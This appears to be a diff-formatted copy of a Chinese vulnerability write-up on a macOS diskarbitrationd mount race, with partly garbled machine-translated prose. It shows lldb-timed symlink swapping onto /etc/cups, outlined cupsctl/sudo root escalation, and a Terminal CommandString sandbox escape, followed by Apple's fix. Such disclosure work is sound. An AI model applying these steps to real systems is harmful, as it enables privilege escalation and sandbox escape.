@@ -33,58 +33,58 @@ useUserFS则变量
 TRUE设置为 。  
   
 ```
-void DAFileSystemMountWithArguments( DAFileSystemRef filesystem,
-                                     CFURLRef device,
-                                     CFStringRef volumeName,
-                                     CFURLRef mountpoint,
-                                     uid_t userUID,
-                                     gid_t userGID,
-                                     CFStringRef preferredMountMethod,
-                                     DAFileSystemCallback callback,
-                                     void * callbackContext,
-                                     ... )
+void DAFileSystemMountWithArguments( DAFileSystemRef filesystem,
+                                     CFURLRef device,
+                                     CFStringRef volumeName,
+                                     CFURLRef mountpoint,
+                                     uid_t userUID,
+                                     gid_t userGID,
+                                     CFStringRef preferredMountMethod,
+                                     DAFileSystemCallback callback,
+                                     void * callbackContext,
+                                     ... )
 {
-    ...
-    if ( fsImplementation != NULL )
-    {
-        ...
-        if ( preferredMountMethod != NULL )
-        {
-            if ( useUserFS == FALSE )
-            {
-                if ( ( CFStringCompare( CFSTR("UserFS"), preferredMountMethod, kCFCompareCaseInsensitive ) == 0) &&
-                     ( ___CFArrayContainsString( fsImplementation, CFSTR("UserFS") ) == TRUE ) )
-                {
-                    **useUserFS = TRUE;**
-                }
-            }
-        }
-    }
-    ...
+    ...
+    if ( fsImplementation != NULL )
+    {
+        ...
+        if ( preferredMountMethod != NULL )
+        {
+            if ( useUserFS == FALSE )
+            {
+                if ( ( CFStringCompare( CFSTR("UserFS"), preferredMountMethod, kCFCompareCaseInsensitive ) == 0) &&
+                     ( ___CFArrayContainsString( fsImplementation, CFSTR("UserFS") ) == TRUE ) )
+                {
+                    **useUserFS = TRUE;**
+                }
+            }
+        }
+    }
+    ...
 }
 ```  
   
   
-useUserFS 当设置为 时  
+useUserFS 当设置为 时  
 TRUE，使用UserFS API  
 diskarbitrationd挂载文件系统。  
   
 ```
-if ( useUserFS )
+if ( useUserFS )
 {
-    CFArrayRef argumentList;
-    argumentList = CFStringCreateArrayBySeparatingStrings( kCFAllocatorDefault, devicePath, CFSTR( "/" ) );
-    if ( argumentList )
-    {
-        ...
-        DAThreadExecute(__DAMountUserFSVolume, context, __DAMountUserFSVolumeCallback, context);
-        CFRelease( argumentList );
-    }
-    else
-    {
-        status = EINVAL;
-    }
-    goto DAFileSystemMountErr;
+    CFArrayRef argumentList;
+    argumentList = CFStringCreateArrayBySeparatingStrings( kCFAllocatorDefault, devicePath, CFSTR( "/" ) );
+    if ( argumentList )
+    {
+        ...
+        DAThreadExecute(__DAMountUserFSVolume, context, __DAMountUserFSVolumeCallback, context);
+        CFRelease( argumentList );
+    }
+    else
+    {
+        status = EINVAL;
+    }
+    goto DAFileSystemMountErr;
 }
 ```  
   
@@ -100,24 +100,24 @@ disk仲裁检查挂载点是否存在于处理请求的
 _DAServerSessionQueueRequest函数中。sandbox escapeprivilege escalation  
   
 ```
-kern_return_t _DAServerSessionQueueRequest( mach_port_t _session,
+kern_return_t _DAServerSessionQueueRequest( mach_port_t _session,
 ...
-if ( path )
+if ( path )
 {
-    status = sandbox_check_by_audit_token(_token, "file-mount", SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL, path);
-    if ( status )
-    {
-        status = kDAReturnNotPrivileged;
-    }
-    free( path );
+    status = sandbox_check_by_audit_token(_token, "file-mount", SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL, path);
+    if ( status )
+    {
+        status = kDAReturnNotPrivileged;
+    }
+    free( path );
 }
 ...
-if ( audit_token_to_euid( _token ) )
+if ( audit_token_to_euid( _token ) )
 {
-    if ( audit_token_to_euid( _token ) != DADiskGetUserUID( disk ) )
-    {
-        status = kDAReturnNotPrivileged;
-    }
+    if ( audit_token_to_euid( _token ) != DADiskGetUserUID( disk ) )
+    {
+        status = kDAReturnNotPrivileged;
+    }
 }
 ```  
   
@@ -131,7 +131,7 @@ sandbox_check_by_audit_token()通过检查沙箱、UID等来验证挂载路径�
 首先，创建使用MS-DOS (FAT)文件系统的磁盘映像。  
   
 ```
-hdiutil create -fs "MS-DOS" -size 10MB -volname disk dos.dmg
+hdiutil create -fs "MS-DOS" -size 10MB -volname disk dos.dmg
 ```  
   
   
@@ -144,17 +144,17 @@ sandbox_check_by_audit_token进程并在函数中设置断点。
 (lldb) process attach --name "diskarbitrationd"
 Process 113 stopped
 * thread #1, stop reason = signal SIGSTOP
-    frame #0: 0x000000019e3b3564 libsystem_kernel.dylib`__sigsuspend_nocancel + 8
+    frame #0: 0x000000019e3b3564 libsystem_kernel.dylib`__sigsuspend_nocancel + 8
 libsystem_kernel.dylib`__sigsuspend_nocancel:
 -> 0x19e3b3564 <+8>: b.lo 0x19e3b3584 ; <+40>
-    0x19e3b3568 <+12>: pacibsp 
-    0x19e3b356c <+16>: stp x29, x30, [sp, #-0x10]!
-    0x19e3b3570 <+20>: mov x29, sp
+    0x19e3b3568 <+12>: pacibsp 
+    0x19e3b356c <+16>: stp x29, x30, [sp, #-0x10]!
+    0x19e3b3570 <+20>: mov x29, sp
 Target 0: (diskarbitrationd) stopped.
-Executable module set to "/usr/libexec/diskarbitrationd".
-Architecture set to: arm64e-apple-macosx-.
+Executable module set to "/usr/libexec/diskarbitrationd".
+Architecture set to: arm64e-apple-macosx-.
 (lldb) b sandbox_check_by_audit_token
-Breakpoint 2: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token, address = 0x00000001aa59bc50
+Breakpoint 2: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token, address = 0x00000001aa59bc50
 (lldb) c
 Process 113 resuming
 ```  
@@ -171,9 +171,9 @@ tree@forest ~ % umount /Volumes/DISK
 tree@forest ~ % diskutil list
 ...
 /dev/disk5 (disk image):
-   #: TYPE NAME SIZE IDENTIFIER
-   0: FDisk_partition_scheme +10.5 MB disk5
-   1: DOS_FAT_32 DISK 10.5 MB disk5s1
+   #: TYPE NAME SIZE IDENTIFIER
+   0: FDisk_partition_scheme +10.5 MB disk5
+   1: DOS_FAT_32 DISK 10.5 MB disk5s1
 tree@forest ~ % hdiutil attach -mountpoint mnt /dev/disk5s1
 ```  
   
@@ -186,37 +186,37 @@ tree@forest ~ % hdiutil attach -mountpoint mnt /dev/disk5s1
 1. hdiutil attach -mountpoint mnt /dev/disk5s1执行命令将disk5s1分区挂载到mnt目录。  
   
 ```
-Process 113 stopped
+Process 113 stopped
 * thread #3, queue = 'DAServer', stop reason = breakpoint 2.1
-    frame #0: 0x00000001aa59bc50 libsystem_sandbox.dylib`sandbox_check_by_audit_token
+    frame #0: 0x00000001aa59bc50 libsystem_sandbox.dylib`sandbox_check_by_audit_token
 libsystem_sandbox.dylib`sandbox_check_by_audit_token:
--> 0x1aa59bc50 <+0>: pacibsp 
-    0x1aa59bc54 <+4>: sub sp, sp, #0xb0
-    0x1aa59bc58 <+8>: stp x20, x19, [sp, #0x90]
-    0x1aa59bc5c <+12>: stp x29, x30, [sp, #0xa0]
+-> 0x1aa59bc50 <+0>: pacibsp 
+    0x1aa59bc54 <+4>: sub sp, sp, #0xb0
+    0x1aa59bc58 <+8>: stp x20, x19, [sp, #0x90]
+    0x1aa59bc5c <+12>: stp x29, x30, [sp, #0xa0]
 Target 0: (diskarbitrationd) stopped.
 (lldb) finish
-Process 113 stopped
+Process 113 stopped
 * thread #3, queue = 'DAServer', stop reason = step out
-    frame #0: 0x00000001005463b8 diskarbitrationd`___lldb_unnamed_symbol712 + 1488
+    frame #0: 0x00000001005463b8 diskarbitrationd`___lldb_unnamed_symbol712 + 1488
 diskarbitrationd`___lldb_unnamed_symbol712:
--> 0x1005463b8 <+1488>: mov w8, #0x9 ; =9 
-    0x1005463bc <+1492>: movk w8, #0xf8da, lsl #16
-    0x1005463c0 <+1496>: str x8, [sp, #0x30]
-    0x1005463c4 <+1500>: mov x20, x19
+-> 0x1005463b8 <+1488>: mov w8, #0x9 ; =9 
+    0x1005463bc <+1492>: movk w8, #0xf8da, lsl #16
+    0x1005463c0 <+1496>: str x8, [sp, #0x30]
+    0x1005463c4 <+1500>: mov x20, x19
 Target 0: (diskarbitrationd) stopped.
 (lldb) b CFRelease
 Breakpoint 3: where = CoreFoundation`CFRelease, address = 0x000000019e462edc
 (lldb) c
-Process 113 resuming
-Process 113 stopped
+Process 113 resuming
+Process 113 stopped
 * thread #3, queue = 'DAServer', stop reason = breakpoint 3.1
-    frame #0: 0x000000019e462edc CoreFoundation`CFRelease
+    frame #0: 0x000000019e462edc CoreFoundation`CFRelease
 CoreFoundation`CFRelease:
--> 0x19e462edc <+0>: pacibsp 
-    0x19e462ee0 <+4>: stp x20, x19, [sp, #-0x20]!
-    0x19e462ee4 <+8>: stp x29, x30, [sp, #0x10]
-    0x19e462ee8 <+12>: add x29, sp, #0x10
+-> 0x19e462edc <+0>: pacibsp 
+    0x19e462ee0 <+4>: stp x20, x19, [sp, #-0x20]!
+    0x19e462ee4 <+8>: stp x29, x30, [sp, #0x10]
+    0x19e462ee8 <+12>: add x29, sp, #0x10
 Target 0: (diskarbitrationd) stopped.
 (lldb) finish
 ```  
@@ -230,7 +230,7 @@ Target 0: (diskarbitrationd) stopped.
   
 ```
 tree@forest ~ % rm -rf mnt
-tree@forest ~ % ln -s /etc/cups/ mnt
+tree@forest ~ % ln -s /etc/cups/ mnt
 ```  
   
   
@@ -248,10 +248,10 @@ Process 113 resuming
   
 ```
 tree@forest ~ % mount
-/dev/disk4s1s1 on / (apfs, sealed, local, read-only, journaled)
-devfs on /dev (devfs, local, nobrowse)
+/dev/disk4s1s1 on / (apfs, sealed, local, read-only, journaled)
+devfs on /dev (devfs, local, nobrowse)
 ...
-/dev/disk5s1 on /private/etc/cups (msdos, local, nodev, nosuid, noowners, noatime, fskit)
+/dev/disk5s1 on /private/etc/cups (msdos, local, nodev, nosuid, noowners, noatime, fskit)
 ```  
   
   
@@ -286,7 +286,7 @@ cupsctl使用命令创建错误日志文件
 cupsctl命令  
   
 4.  
-sudo 通过命令获取root权限  
+sudo 通过命令获取root权限  
   
 **B.沙箱逃逸**  
   
@@ -294,7 +294,7 @@ sudo 通过命令获取root权限
   
 1.  
 preference file将终端插入磁盘映像  
-- CommandString 使用该选项可将LPE 脚本设置为在运行终端时运行。  
+- CommandString 使用该选项可将LPE 脚本设置为在运行终端时运行。  
   
 2.将磁盘装载到您的用户首选项目录中并运行终端。  
   
@@ -318,8 +318,8 @@ preference file将终端插入磁盘映像
 改进了 fskitd 以根据调用者的用户 ID 验证权限。  
   
 ```
-token = [FSAuditToken new];
-token = [token tokenWithRuid:gDAConsoleUserUID];
+token = [FSAuditToken new];
+token = [token tokenWithRuid:gDAConsoleUserUID];
 ```  
   
   
